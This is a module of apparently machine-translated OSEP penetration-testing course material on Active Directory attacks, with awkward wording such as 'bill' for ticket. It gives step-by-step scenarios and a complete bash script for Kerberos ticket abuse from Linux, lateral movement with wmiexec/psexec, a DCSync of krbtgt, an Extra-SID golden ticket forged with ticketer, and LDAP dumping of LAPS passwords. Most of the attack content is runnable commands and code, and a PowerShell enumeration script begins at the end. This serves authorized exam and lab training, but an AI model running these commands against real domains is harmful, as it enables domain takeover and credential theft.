::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# 12 · AD Attacks: Tickets, Delegation, LAPS, Trust and ADCS (Scenarios 47, 49–55)

> Front: press [00-environment-and-infra](/modules/00-environment-and-infra) Set up the attack machine directory, monitoring and delivery. unified placeholder `LHOST LPORT TARGET DOMAIN USER PASS NTHASH PAYLOAD URL`。
>
> The teaching materials are based on cheat sheet（，Hereinafter referred to as CS）Correspondence: scene 47←C5/Textbook§19.3；49←C1；50←C1/Textbook21、23 chapter；51←C5/Textbook21、23 chapter；52←Textbook21、23 chapter；53←C5/Textbook21 chapter；54←Textbook§22.2.1；55←Textbook§22.2.2。CS big festival：`AD Enumeration`(≈L7768)、`AD Attacking`(≈L8251，Contains Unconstrained Delegation L8253 / Golden Tickets L8394 / LAPS L8460)、`Kerberos`(≈L7071)。

**Principle of penetration**: 80% of the work of this module occurs on the attack machine Kali (impacket suite + certipy), only "inducing authentication/ticket capture" must be completed on the target Windows host side. First write clearly "where the bill comes from, which service it is going to, and in whose identity" before proceeding - if the bill is in the wrong direction, it will be useless no matter how correct the order is.

| scene | one sentence goal | Scripts used |
|---|---|---|
| 47 | Linux Hold a ticket → Windows Serve | `m12-kerberos-tickets-linux.sh` |
| 49 | read LAPS → Executed by local administrator | `m12-ad-enum-windows.ps1` / `m12-ad-enum-linux.sh` + `m12-laps-and-trust-notes.md` |
| 50 | Unconstrained delegation DC TGT → DCSync | `m12-delegation-attacks.ps1` |
| 51 | RBCD：Write `AllowedToAct` → Impersonate administrator | `m12-delegation-attacks.ps1` |
| 52 | constrained delegation S4U → Target SPN Serve | `m12-delegation-attacks.ps1` |
| 53 | subdomain → Lingen (trust judgment + Extra SID） | `m12-ad-enum-linux.sh` + `m12-laps-and-trust-notes.md` |
| 54 | ESC1 template → Certificate authentication | `m12-adcs-esc1-esc8.sh` |
| 55 | ESC8 HTTP Register relay | `m12-adcs-esc1-esc8.sh` |

---

## Scenario 47: You already have a domain ticket on Linux, but you need to access the Windows service

**Situation**: A domain-joined Linux has been controlled, with a valid and accessible credential cache (ccache) or keytab; the next hop is a service (SMB/WinRM/HTTP) in the Windows domain, and there is no clear text password.

**Assumptions**: The deviation between Linux time and DC is <5 minutes (Kerberos hard requirement, check with `date` first); the attack machine can directly connect to DC's TCP/UDP 88 and the target's 445/5985; known `DOMAIN` (including FQDN case) and DC host name/IP. Note: Key distribution must use **domain name in all lowercase**, and the target must be accessed using **FQDN** consistent with SPN (IP cannot be used).

**Prepare (attacker)**：
```bash
export KRB5CCNAME=/home/kali/osep/tickets/current.ccache   # Session level, all -k tools read it
klist -e          # Check whose ticket and encryption type are in the cache（rc4/aes decide whether it can be DC accept）
# kirbi(Rubeus)→ccache conversion; keytab→kinit see m12-kerberos-tickets-linux.sh
```
`/etc/krb5.conf` Minimal template with `/etc/hosts`（`DC01.corp.local`、`TARGET` of FQDN Both must be parsable) see `m12-kerberos-tickets-linux.sh`。

**Procedure**：
```bash
# 1) Direct authentication with TGT/TGS (-k reads KRB5CCNAME, -no-pass no longer requires a password)
smbclient -k -L //WS02.corp.local
impacket-wmiexec -k -no-pass DOMAIN/USER@WS02.corp.local     # need cifs/WS02 of TGS，Tool automatic application
impacket-secretsdump -k -no-pass DC01.corp.local             # need DC Machine ticket, first confirm who is on the ticket
evil-winrm -i ws02.corp.local -k                             # Walk Kerberos need wsman/WS02
# 2) The ticket identity has no access rights to the target service → use the existing ticket to request the TGS of other services
#    (The key is in the cache and there is no need to enter the password; see the script ask_tgs function for details)
```
**Scripts used**: `m12-kerberos-tickets-linux.sh` (ccache/keytab usage, format conversion, krb5.conf template, TGS required by service).

**Validation**: `smbclient -k -L //WS02` can list the shares / `wmiexec` is passed when exiting the shell; `klist` can see the new TGS. If `KRB_AP_ERR_MODIFIED` is reported, it is mostly because the bill subject does not match the SPN/encryption type, and it is not a network problem.

**Failure branches and alternatives**：
- There is a ticket in the cache but the target cannot be accessed → ① Check target FQDN whether with SPN consistent（`smbclient -k -L //WS02` Change `//ws02.corp.local`）；② Is your ticket subject covered by this service? ACL reject → Change service（WinRM Just don’t open it SMB）。
- KDC Report encryption type is not supported → `/etc/krb5.conf` facing `default_tkt_enctypes/default_tgs_enctypes` join in `rc4-hmac` or supplement `aes256-cts-hmac-sha1-96`，and DC Support set alignment。
- time offset error（`Clock skew too great`）→ `sudo ntpdate DC01` or manual calibration, the deviation must be <5 minute。
- Access the intranet across network segments Windows Service (the target is only reachable on the intranet segment)）→ Do port forwarding first/Ligolo（[08-pivoting-tunneling](/modules/08-pivoting-tunneling)），**After forwarding Kerberos**，Note that the machines on the forwarding path must also be reachable. DC:88。

**Exam / OPSEC notes**: Use harmless actions to verify ticket identity first (`smbclient -L`) and then use execution tools; ccache files are stored separately by session (`~/osep/tickets/`) to prevent domain A notes from being used as domain B; all `-k` tools eat `KRB5CCNAME`, and switching notes must be done explicitly `export` and before the command `klist` Confirm.

---

#### `m12-kerberos-tickets-linux.sh` {#m12-kerberos-tickets-linux-sh}

````bash
#!/usr/bin/env bash
# =============================================================================
# Purpose: Linux side Kerberos ticket workbench - starting from "existing ccache / keytab / kirbi",
#       Do bill viewing, format conversion, TGT/TGS application, and use -k to run Windows services
#       （smbclient / wmiexec / psexec / smbexec / secretsdump / evil-winrm），
#       Comes with /etc/krb5.conf and the minimal available template for /etc/hosts·resolv.
# Scenario: M12 Scenario 47 (domain ticket already exists on Linux and needs to access Windows services);
#       Also serving 50/51/52/53 (how to use the tickets once you get them falls on Windows).
# Dependencies: krb5-user (klist/kinit/kvno/ktutil, Kali: sudo apt install -y krb5-user);
#       impacket（impacket-ticketConverter / -getTGT / -getST / -wmiexec / -psexec /
#       -smbexec / -secretsdump，Kali: sudo apt install -y impacket-scripts）；
#       smbclient (samba client); evil-winrm (gem install evil-winrm, optional);
#       When the tool is missing, a clear error will be printed and an installation prompt will be given, and it will not exit silently.
# Use: ./m12-kerberos-tickets-linux.sh -m info -c ~/osep/tickets/current.ccache
#       ./m12-kerberos-tickets-linux.sh -m krb5conf -d corp.local -s DC01.corp.local -o /tmp/krb5.conf
#       ./m12-kerberos-tickets-linux.sh -m convert -T dc.kirbi -o dc.ccache
#       ./m12-kerberos-tickets-linux.sh -m auth -d corp.local -s DC01.corp.local -t WS02.corp.local
#       ./m12-kerberos-tickets-linux.sh -m tgs -S cifs/WS02.corp.local -d corp.local
# Placeholders (all passed in as parameters, no real values ​​are hardcoded in the script):
#   DOMAIN = domain FQDN (-d, for example corp.local; REALM automatically capitalizes CORP.LOCAL)
#   TARGET = DC/target host (-s/-t, e.g. DC01.corp.local, WS02.corp.local)
#   USER/PASS/NTHASH = when password/hash is required (-u/-p/-H)
#   LHOST = attack machine IP (only used when -i passes the IP of DC/CA, used in hosts template)
# Test status: Not tested in a real domain environment; local bash -n passed. Execute class mode default print command,
#           Add -x to actually execute it (to avoid hitting unverified commands directly into the exam environment).
# Differences from docs/12-ad-attacks.md:
#   1) The document classifies kirbi→ccache and keytab→kinit into this script, and splits them into convert / in the implementation.
#      There are two modes of keytab, the parameters are -T/-o and -k/-u respectively, which are consistent with the behavior described in the document.
#   2) The document does not mention the specific command of "require TGS by service", here we use tgs mode to complete it (kvno and
#      impacket-getST two ways), corresponding to the sentence "See the script ask_tgs function" in the document.
#   3) The cross-domain (subdomain→forest root) step document is placed in scene 53. This script provides cross mode for connection printing.
#      The golden ticket body command is in m12-laps-and-trust-notes.md.
# =============================================================================
set -u

MODE="info"
DOMAIN=""       # -d  domain FQDN
DC=""           # -s  DC Host FQDN
TGT_HOST=""     # -t  Target Windows Host FQDN
USER=""         # -u
PASS=""         # -p
NTHASH=""       # -H
CCACHE=""       # -c  ccache path
KEYTAB=""       # -k  keytab path
TICKET=""       # -T  Notes to be converted（kirbi / ccache）
OUTFILE=""      # -o  output file
SPN=""          # -S  Serve SPN
DCIP=""         # -i  DC/Target IP（only hosts For templates）
EXEC=0          # -x  Real execution (default only prints）
TICKET_DIR="$HOME/osep/tickets"

usage() {
    sed -n '2,32p' "$0" | sed 's/^# \{0,1\}//'
    cat <<'EOF'

parameter：
  -m <mode>   Job mode (default info）：
       info      View current KRB5CCNAME and bill contents（klist -e）+ Time deviation self-test
       krb5conf  Generate minimum /etc/krb5.conf template（-o Specify the path to write out. By default, it only prints.）
       hosts     generate /etc/hosts and resolv parsing template（Kerberos The ____ does not work IP access）
       kinit     Use plain text password to get TGT（kinit USER@REALM）
       keytab    ktutil make keytab and use it kinit（need -u and -p）
       convert   kirbi <-> ccache transfer（impacket-ticketConverter，need -T and -o）
       tgt       Use password/Hash TGT（impacket-getTGT，need -u and -p or -H）
       tgs       Apply by service TGS（kvno；or impacket-getST -spn，need -S）
       auth      Use existing ticket Windows Serve：smbclient/wmiexec/psexec/smbexec/
                 secretsdump/evil-winrm full set -k command (requires -d and -t）
       cross     Linux → Windows of cross-domain (subdomain→Lin Gen) step printing and pre-prompts
       all       info + krb5conf + hosts + auth（Cold start one-stop service）
  -d <fqdn>   domain FQDN（DOMAIN），Required for most modes
  -s <host>   DC Host FQDN（TARGET）
  -t <host>   Target Windows Host FQDN（TARGET），auth Pattern required
  -u <user>   username（USER）
  -p <pass>   clear text password（PASS）
  -H <hash>   NTHASH（impacket use）
  -c <path>   ccache path (override KRB5CCNAME）
  -k <path>   keytab path
  -T <path>   Bill file to be converted（.kirbi / .ccache）
  -o <path>   output file（krb5conf / keytab / convert / tgt use）
  -S <spn>    Serve SPN，like cifs/WS02.corp.local（tgs model）
  -i <ip>     DC or target IP（LHOST Written in the same network segment, only hosts Template used）
  -x          Really execute the command (default only prints, check first and then execute)）
  -h          This help

exit code：0 normal / 1 Parameter or dependency error
EOF
    exit 0
}

err()  { printf '[!] %s\n' "$*" >&2; }
info() { printf '[*] %s\n' "$*"; }
head_() { printf '\n===== %s =====\n' "$*"; }
have() { command -v "$1" >/dev/null 2>&1; }

# Print command line: Only add single quotes to parameters containing spaces/quotes to ensure that the output can be directly copied and executed.
printable() {
    local out="" a
    for a in "$@"; do
        case "$a" in
            *" "*|*"'"*|*'"'*) out="$out '$a'" ;;
            *)                 out="$out $a" ;;
        esac
    done
    printf '%s\n' "${out# }"
}

# Print (or execute) a command: print first, then execute at -x; missing commands give readable prompts
run() {
    printable "$@"
    if [ "$EXEC" != "1" ]; then return 0; fi
    if ! have "$1"; then
        err "Missing command: $1 (Kali: sudo apt install -y krb5-user impacket-scripts samba-client)"
        return 0
    fi
    "$@" || err "The previous command returned non-zero: troubleshoot according to the above output (ticket body/SPN/encryption type/time)"
    return 0
}

while getopts "m:d:s:t:u:p:H:c:k:T:o:S:i:xh" opt; do
    case "$opt" in
        m) MODE="$OPTARG" ;;
        d) DOMAIN="$OPTARG" ;;
        s) DC="$OPTARG" ;;
        t) TGT_HOST="$OPTARG" ;;
        u) USER="$OPTARG" ;;
        p) PASS="$OPTARG" ;;
        H) NTHASH="$OPTARG" ;;
        c) CCACHE="$OPTARG" ;;
        k) KEYTAB="$OPTARG" ;;
        T) TICKET="$OPTARG" ;;
        o) OUTFILE="$OPTARG" ;;
        S) SPN="$OPTARG" ;;
        i) DCIP="$OPTARG" ;;
        x) EXEC=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

# REALM is always capitalized (Kerberos requirement)
REALM=""
if [ -n "$DOMAIN" ]; then
    REALM="$(printf '%s' "$DOMAIN" | tr '[:lower:]' '[:upper:]')"
fi

# ccache defaults and exports: all -k tools read KRB5CCNAME
if [ -n "$CCACHE" ]; then
    KRB5CCNAME="$CCACHE"
    export KRB5CCNAME
elif [ -n "${KRB5CCNAME:-}" ]; then
    CCACHE="$KRB5CCNAME"
else
    CCACHE="$TICKET_DIR/current.ccache"
fi

require_mode_arg() {
    local missing=""
    while [ "$#" -gt 0 ]; do
        case "$1" in
            DOMAIN) [ -z "$DOMAIN" ] && missing="$missing -d" ;;
            DC)     [ -z "$DC" ]     && missing="$missing -s" ;;
            TARGET) [ -z "$TGT_HOST" ] && missing="$missing -t" ;;
            USER)   [ -z "$USER" ]   && missing="$missing -u" ;;
            PASS)   [ -z "$PASS" ]   && missing="$missing -p" ;;
            SPN)    [ -z "$SPN" ]    && missing="$missing -S" ;;
            TICKET) [ -z "$TICKET" ] && missing="$missing -T" ;;
            OUTFILE)[ -z "$OUTFILE" ] && missing="$missing -o" ;;
        esac
        shift
    done
    if [ -n "$missing" ]; then
        err "Mode -m $MODE missing required argument: $missing"
        err "(Use -h to view the parameters required for each mode)"
        exit 1
    fi
}

# ---------------------------------------------------------------------------
mode_info() {
    head_ "Ticket and session self-test (info)"
    info "KRB5CCNAME = ${KRB5CCNAME:- (not set, the tool will fall back to /tmp/krb5cc_UID)}"
    info "Session-level export: export KRB5CCNAME=$CCACHE"
    if [ ! -f "$CCACHE" ]; then
        err "The ccache file does not exist: ${CCACHE} (use convert/tgt/kinit mode to output first, or -c to specify the correct path)"
    fi
    run klist -e
    echo
    info "Time drift check (Kerberos requires <5 minutes from DC):"
    run date
    if [ -n "$DC" ]; then
        info "Check DC time: nc -vz $DC 445 to continue; calibration: sudo ntpdate $DC"
        info "(When ntpdate is not available: sudo rdate -n $DC or date -s 'YYYY-MM-DD HH:MM:SS')"
    else
        info "After giving -s DC01.corp.local, you can print the time comparison and calibration command with DC"
    fi
    echo
    info "Common judgments:"
    info "· The Default principal in klist determines "who you are" and determines which services can be accessed"
    info "· Most DCs accept etype rc4-hmac / aes256-cts-hmac-sha1-96"
    info "· KRB_AP_ERR_MODIFIED mostly means that the ticket body does not match the SPN or encryption type, and is not a network problem."
    info "· Clock skew too great means the time is off, correct the time first and try again"
}

# ---------------------------------------------------------------------------
mode_krb5conf() {
    require_mode_arg DOMAIN DC
    head_ "/etc/krb5.conf minimal template (krb5conf)"
    local conf
    conf="$(cat <<EOF
[libdefaults]
    default_realm = $REALM
    dns_lookup_kdc = false
    dns_lookup_realm = false
    # Aligned with the DC support set: the old environment only uses rc4-hmac, and the new environment commonly uses aes256
    default_tkt_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    default_tgs_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    permitted_enctypes  = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    udp_preference_limit = 1
    kdc_timesync = 1
    ccache_type = 4
    rdns = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true

[realms]
    $REALM = {
        kdc = $DC
        admin_server = $DC
        default_domain = $DOMAIN
    }

[domain_realm]
    .$DOMAIN = $REALM
    $DOMAIN = $REALM
EOF
)"
    printf '%s\n' "$conf"
    if [ -n "$OUTFILE" ]; then
        printf '%s\n' "$conf" > "$OUTFILE" \
            && info "Written out: ${OUTFILE} (effective: sudo cp $OUTFILE /etc/krb5.conf)" \
            || err "Failed to write: ${OUTFILE} (read-only? Replace -o /tmp/krb5.conf)"
    else
        info "To download: add -o /tmp/krb5.conf and then sudo cp /tmp/krb5.conf /etc/krb5.conf"
        info "Back up before copying: sudo cp /etc/krb5.conf /etc/krb5.conf.bak"
    fi
    echo
    info "When an encryption type error is reported (KDC has no support for encryption type): Delete the unnecessary etype to"
    info "Only rc4-hmac is left and try again; or add aes256-cts-hmac-sha1-96 in reverse."
}

# ---------------------------------------------------------------------------
mode_hosts() {
    require_mode_arg DOMAIN DC
    head_ "Name resolution template (hosts) - Kerberos must use FQDN and cannot use IP direct connection"
    local ip1="$DCIP"
    [ -z "$ip1" ] && ip1="TARGET"
    echo "# /etc/hosts Append (IP replaces TARGET with real value; FQDN must be consistent with the writing in SPN)"
    echo "$ip1    $DC    ${DC%%.*}"
    if [ -n "$TGT_HOST" ]; then
        echo "TARGET    $TGT_HOST    ${TGT_HOST%%.*}"
    fi
    echo
    echo "#Append method (requires root)"
    echo "sudo sh -c 'echo \"$ip1    $DC    ${DC%%.*}\" >> /etc/hosts'"
    if [ -n "$TGT_HOST" ]; then
        echo "sudo sh -c 'echo \"TARGET    $TGT_HOST    ${TGT_HOST%%.*}\" >> /etc/hosts'"
    fi
    echo
    info "When using domain DNS instead of hosts (cleaner):"
    echo "sudo sh -c 'echo \"nameserver TARGET\"> /etc/resolv.conf' # First replace TARGET with the IP of the DC"
    echo "# Or temporary: dig @TARGET $DC +short to verify whether the parsing returns the correct IP"
    echo
    info "Verification: getent hosts $DC should return IP; ping failure will not affect it, as long as the resolution pair + 88/445 is reachable"
    info "Note: FQDN and short name must be written in /etc/hosts at the same time, otherwise some tools cannot spell out SPN."
}

# ---------------------------------------------------------------------------
mode_kinit() {
    require_mode_arg DOMAIN USER PASS
    head_ "Get TGT (kinit) with clear text password"
    info "REALM must be capitalized: $REALM"
    run kinit "$USER@$REALM"
    echo
    info "Tip: Paste PASS when prompted for password; or (experimental environment only) printf 'PASS' | kinit $USER@$REALM"
    run klist -e
    echo
    info "Renewal: kinit -R (the bill is still within the renew period)"
}

# ---------------------------------------------------------------------------
mode_keytab() {
    require_mode_arg DOMAIN USER PASS
    local kt="$OUTFILE"
    [ -z "$kt" ] && kt="$TICKET_DIR/$USER.keytab"
    head_ "keytab ticket creation (keytab) -> $kt"
    echo "# ktutil interactive steps (equivalent non-interactive see below)"
    echo "ktutil"
    echo "  addent -password -p $USER@$REALM -k 1 -e rc4-hmac"
    echo "  wkt $kt"
    echo "  quit"
    echo
    echo "kinit $USER@$REALM -k -t $kt"
    echo "klist -e"
    echo
    info "Non-interactive writing method (use printf in the script to feed ktutil):"
    echo "printf 'addent -password -p %s@%s -k 1 -e rc4-hmac\\n%s\\nwkt %s\\nquit\\n' \\" "$USER" "$REALM" "PASS" "$kt"
    echo "  | ktutil"
    echo
    info "The -e of ktutil must be consistent with the encryption type supported by DC; rc4-hmac has the best compatibility."
    info "After creating the keytab, remember: kinit to generate ccache before exporting KRB5CCNAME=$CCACHE."
    mkdir -p "$TICKET_DIR" 2>/dev/null || true
}

# ---------------------------------------------------------------------------
mode_convert() {
    require_mode_arg TICKET
    local out="$OUTFILE"
    [ -z "$out" ] && out="${TICKET%.*}.ccache"
    head_ "Ticket format conversion (convert): $TICKET -> $out"
    case "$TICKET" in
        *.kirbi|*.kirby)
            info "kirbi (Rubeus/mimikatz export) -> ccache"
            run impacket-ticketConverter "$TICKET" "$out"
            ;;
        *.ccache)
            info "ccache -> kirbi (for Windows side Rubeus/mimikatz ptt)"
            run impacket-ticketConverter "$TICKET" "$out"
            ;;
        *.txt|*.b64)
            info "base64 TGT text (Rubeus monitor output) -> save to file first and then transfer:"
            echo "base64 -d $TICKET > ${TICKET%.*}.kirbi"
            run impacket-ticketConverter "${TICKET%.*}.kirbi" "$out"
            ;;
        *)
            err "Unable to determine ticket type from extension: ${TICKET} (supports .kirbi / .ccache / .txt)"
            err "Explicitly specify output to -o, the script is still processed by impacket-ticketConverter"
            run impacket-ticketConverter "$TICKET" "$out"
            ;;
    esac
    echo
    info "After conversion: export KRB5CCNAME=$out and then klist -e to confirm the body (such as DC01\$)"
    info "Note on the Rubeus side base64 -> file: the base64 string must be a single line, do not bring the log timestamp into it"
}

# ---------------------------------------------------------------------------
mode_tgt() {
    require_mode_arg DOMAIN DC USER
    if [ -z "$PASS" ] && [ -z "$NTHASH" ]; then
        err "tgt mode requires -p PASS or -H NTHASH"; exit 1
    fi
    local out="$OUTFILE"
    [ -z "$out" ] && out="$TICKET_DIR/$USER.ccache"
    head_ "Get TGT (impacket-getTGT) -> $out"
    if [ -n "$NTHASH" ]; then
        run impacket-getTGT -dc-ip "$DC" -hashes ":$NTHASH" "$DOMAIN/$USER"
    else
        run impacket-getTGT -dc-ip "$DC" "$DOMAIN/$USER:$PASS"
    fi
    echo
    info "getTGT outputs USER.ccache by default in the current directory, mv to the ticket directory before using -o:"
    echo "mv $USER.ccache $out && export KRB5CCNAME=$out && klist -e"
    info "(impacket-getTGT does not support -o, the output name is fixed to <username>.ccache)"
}

# ---------------------------------------------------------------------------
mode_tgs() {
    require_mode_arg SPN
    head_ "Apply for TGS by service (tgs): $SPN"
    info "Method 1 (with TGT in the cache, the cleanest): kvno - directly use the existing ticket to request a service ticket from KDC"
    run kvno "$SPN"
    echo
    info "Method 2 (use impacket-getST when RBCD/constrained delegation requires S4U, service account credentials are required)"
    if [ -n "$USER" ]; then
        local cred="$DOMAIN/$USER"
        [ -n "$PASS" ] && cred="$cred:$PASS"
        run impacket-getST -spn "$SPN" -dc-ip "$DC" "$cred"
    else
        echo "impacket-getST -spn $SPN -impersonate USER -dc-ip TARGET 'DOMAIN/SVC:PASS'"
    fi
    echo
    run klist -e
    info "After confirming that the service ticket of $SPN appears in the klist, use -m auth to access the corresponding service."
}

# ---------------------------------------------------------------------------
mode_auth() {
    require_mode_arg DOMAIN TARGET
    head_ "Pass Windows service (auth) with existing ticket - all -k -no-pass"
    info "Prefix: export KRB5CCNAME=$CCACHE and then klist -e to confirm who is the subject in the ticket"
    local u="$USER"
    [ -z "$u" ] && u="USER"     # Not given -u When printing, press the placeholder, and whoever is on the ticket will walk as that person.
    echo
    echo "# 1) Read-only verification (do this step first, confirm that the ticket identity is sufficient and then use the execution tool)"
    run smbclient -k -L "//$TGT_HOST"
    echo
    echo "# 2) TGS of cifs/TARGET is required (the tool will automatically apply)"
    run impacket-wmiexec -k -no-pass "$DOMAIN/$u@$TGT_HOST"
    run impacket-smbexec -k -no-pass "$DOMAIN/$u@$TGT_HOST"
    run impacket-psexec -k -no-pass "$DOMAIN/$u@$TGT_HOST"
    echo
    echo "# 3) DCSync (the subject in the ticket needs to be a DC machine account or an identity with replication permissions)"
    [ -z "$DC" ] && DC="$TGT_HOST"
    run impacket-secretsdump -k -no-pass "$DC"
    run impacket-secretsdump -k -no-pass -just-dc-user krbtgt "$DC"
    echo
    echo "# 4) WinRM (requires TGS for wsman/TARGET)"
    run evil-winrm -i "$TGT_HOST" -r "$DOMAIN" -k
    echo
    info "Without -k but want to use domain user password/hash (for comparison):"
    echo "impacket-wmiexec $DOMAIN/USER@$TGT_HOST -hashes :NTHASH"
    echo
    info "Failed branch:"
    info "· smbclient reports KRB_AP_ERR_MODIFIED -> Whether FQDN is consistent with SPN (do not use short name/IP)"
    info "· Report that KDC does not support the encryption type -> change the enctypes of /etc/krb5.conf (see -m krb5conf)"
    info "  · Clock skew -> sudo ntpdate $DC"
    info "  · 目标只在内网段 -> Do port forwarding first/Ligolo（docs/08），After forwarding Kerberos，"
    info "    且转发路径上的机器也要能到 DC of 88"
}

# ---------------------------------------------------------------------------
mode_cross() {
    head_ "Linux -> Windows cross-domain steps (cross, scenario 53 connection)"
    info "① First confirm which domain the current ticket belongs to: klist -e (the suffix of Default principal is the domain)"
    run klist -e
    echo
    info "② Horizontally within the same domain: direct -m auth (-d uses subdomain FQDN, -t uses subdomain host FQDN)"
    echo
    info "③ Subdomain -> Lin Gen: Only when Lin's father and son trust each other and SID filtering is not enabled, can you get the Extra SID golden ticket."
    info "The judgment and complete commands are in m12-laps-and-trust-notes.md; the core three steps:"
    echo "impacket-ticketer -nthash <subdomain krbtgt NT> -domain child.$DOMAIN \\"
    echo "-domain-sid <subdomain SID> -extra-sid '<root domain SID>-519' Administrator"
    echo "   export KRB5CCNAME=Administrator.ccache"
    echo "impacket-secretsdump -k -no-pass <rootDC FQDN>"
    echo
    info "④ /etc/hosts must be able to resolve the FQDN of the subdomain DC and the root DC at the same time (generated by -m hosts)"
    info "⑤ If the trust is external/forest (SID filtering is turned on) -> Extra SID is invalid, return to enumeration to find other entries."
}

# ---------------------------------------------------------------------------
case "$MODE" in
    info)     mode_info ;;
    krb5conf) mode_krb5conf ;;
    hosts)    mode_hosts ;;
    kinit)    mode_kinit ;;
    keytab)   mode_keytab ;;
    convert)  mode_convert ;;
    tgt)      mode_tgt ;;
    tgs)      mode_tgs ;;
    auth)     mode_auth ;;
    cross)    mode_cross ;;
    all)      mode_info; mode_krb5conf; mode_hosts; mode_auth ;;
    *) err "Unknown mode: $MODE"; usage ;;
esac

printf '\n[*] Mode %s ended. By default, only the command is printed; add -x to actually execute it. \n' "$MODE"
info "Next step: get the ticket -> -m convert/tgs processing -> -m auth implementation; see cross-domain -m cross."
````

## Scenario 49: There is no local privilege escalation path, but the current domain user can read LAPS

**Situation**: The initial session is a normal domain user; there is no privilege escalation point on this machine; but the directory ACL allows reading the local administrator password (LAPS) of **another machine**. Goal: Execute remotely as the local administrator of the machine.

**Assumptions**: The target domain has deployed LAPS and the current user has read permission on the password attribute (the domain user group is usually authorized to read during deployment, or you obtain it through ACL/GenericRead); the LAPS password is the password of the local Administrator of the target machine, not the domain user. First, distinguish whether the target uses **traditional LAPS (AdmPwd, attribute `ms-Mcs-AdmPwd*`)** or **Windows LAPS (attribute `msLAPS-Password*`)**. The two query methods are different.

**Prepare (attacker)**: Confirm LDAP query (`ldapsearch` or impacket); prepare remote execution template (target is 445 → `wmiexec/psexec`; only 5985 → WinRM). **Windows side** query script: `m12-ad-enum-windows.ps1`.

**Procedure**：
```bash
# Attack machine (Linux) directly reads attributes from LDAP - first detect which version of LAPS exists (check both attributes)
ldapsearch -x -H ldap://DC01.corp.local -D "CORP\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(objectClass=computer)" \
  ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-EncryptedPassword
# Execute remotely after getting the clear text
impacket-wmiexec CORP/Administrator@WS02.corp.local -hashes :NTHASH   # or -p 'password'
```
Windows side (session machine）：`m12-ad-enum-windows.ps1 -Mode LAPS -ComputerName WS02`；A quick look at the two versions of the command `m12-laps-and-trust-notes.md`。

**Scripts used**: `m12-ad-enum-windows.ps1` (LAPS two-version query + enumeration), `m12-ad-enum-linux.sh` (LDAP batch enumeration with LAPS attributes), `m12-laps-and-trust-notes.md` (command quick check).

**Validation**: The read password can successfully enter WS02 for `wmiexec`/`psexec`; if the password "looks right but cannot be entered", first verify whether the password is for WS02 (LAPS passwords vary by machine), and confirm that the remote execution protocol is open.

**Failure branches and alternatives**：
- Property is empty/Can't read → ① The machine may not be enabled LAPS Or reset the password before it expires, change the machine to enumerate (check the entire domain at once `(ms-Mcs-AdmPwd=*)`）；② The current user does not have read permissions → Find other entrances to this module（RBCD/delegate/certificate) first escalate to an identity with read permissions。
- Windows LAPS What is saved is `msLAPS-EncryptedPassword`（encrypted value）→ Plain text reading requires `Get-LapsADPassword`（Decryption is done by the target machine key) or with DC side LAPS module; pure LDAP When the clear text cannot be obtained**Don't fight to the death**，Change `msLAPS-Password` Plaintext mode machines, or falling back to traditional LAPS machine。
- Only open WinRM Not open SMB → Change `evil-winrm`；Neither agreement is opened → LAPS The password is useless, go back to enumeration to find other entrances。

**Exam / OPSEC notes**: LAPS query will generate LDAP audit logs, which is an expected enumeration behavior. However, do not do an indiscriminate password dump for the entire domain and then try randomly one by one; the execution target only selects the machine required by the scenario. Do not echo the password string into a long command that can be read by the shell history (use environment variables or script parameters).

---

#### `m12-ad-enum-windows.ps1` {#m12-ad-enum-windows-ps1}

````powershell
<#
Usage: pure ADSI / .NET Implemented domain enumeration (does not rely on RSAT ActiveDirectory module and does not depend on
      PowerView）——domain information and MAQ、Users, groups and privileged group members, computers、SPN（Kerberoast
      Candidate), three types of delegation attributes, designated objects ACL summary、LAPS Two-version reading and readability determination。
scene：M12 scene 49（read LAPS）、51（RBCD Prefix: find writable/Computer object with changeable delegation properties）、
      52（Confirm service account msDS-AllowedToDelegateTo with goals SPN）、50（Find an unconstrained host）。
      and m12-ad-enum-linux.sh It's the same thing Linux / Windows Implemented on both sides。
rely：Windows PowerShell 2.0+ Bring your own System.DirectoryServices（DirectoryEntry /
      DirectorySearcher）and System.Security.Principal；No administrator rights are required (no write operations)）。
      suggestion -Domain explicit domain FQDN，Otherwise, use the domain to which the current computer belongs.。
use：.\m12-ad-enum-windows.ps1 -Mode All
      .\m12-ad-enum-windows.ps1 -Mode LAPS -ComputerName WS02
      .\m12-ad-enum-windows.ps1 -Mode Delegation
      .\m12-ad-enum-windows.ps1 -Mode ACL -AclTarget "CN=WS02,CN=Computers,DC=corp,DC=local"
      .\m12-ad-enum-windows.ps1 -Mode Users -MaxResults 50 -Domain corp.local
placeholder：DOMAIN=domain FQDN（corp.local） TARGET=domain name/hostname（WS02） USER=domain username
      PASS=Password (this script is a read-only enumeration, no credentials are required；PASS Appears only in subsequent print commands）
      ——Before running, replace the above placeholders with the real values ​​of the exam environment. No real values ​​are hardcoded in the script.。
Test status: Not available Windows Actual measurement of domain environment; use parentheses on this machine/The quotation mark pairing check passes, and the logic presses ADSI standard
      Usage writing (equivalent to cheat sheet "AD Enumeration / LDAP" Chapter command）。
and docs/12-ad-attacks.md Description of the difference：
  1) document writing `-Mode LAPS -ComputerName WS02`：this script -ComputerName 可带或不带结尾
     of `$`（WS02 and WS02$ accept); do not give -ComputerName When the enumeration field is opened LAPS machine。
  2) Document handle ACL The abstract is described as"ACL summary"，this script ACL mode only does**read**Retrieve and highlight high-risk permissions
     （GenericAll/GenericWrite/WriteDacl/WriteOwner/ExtendedRight），No modifications will be made；
     Delegated attribute**write**exist m12-delegation-attacks.ps1（RBCD model）。
  3) Document not listed SPN/MAQ/The three sub-items of the privilege group are completed here for the scenario. 51/52 Direct access。
#>
[CmdletBinding()]
param(
    [ValidateSet('All','Domain','Users','Groups','Computers','SPN','Delegation','ACL','LAPS','Help')]
    [string]$Mode = 'All',
    [string]$ComputerName = '',        # LAPS Mode: single machine（TARGET），Available with or without $
    [string]$Domain = '',              # DOMAIN：domain FQDN，Leave blank=current domain
    [string]$SearchRoot = '',          # Override search root DN，Leave blank=defaultNamingContext
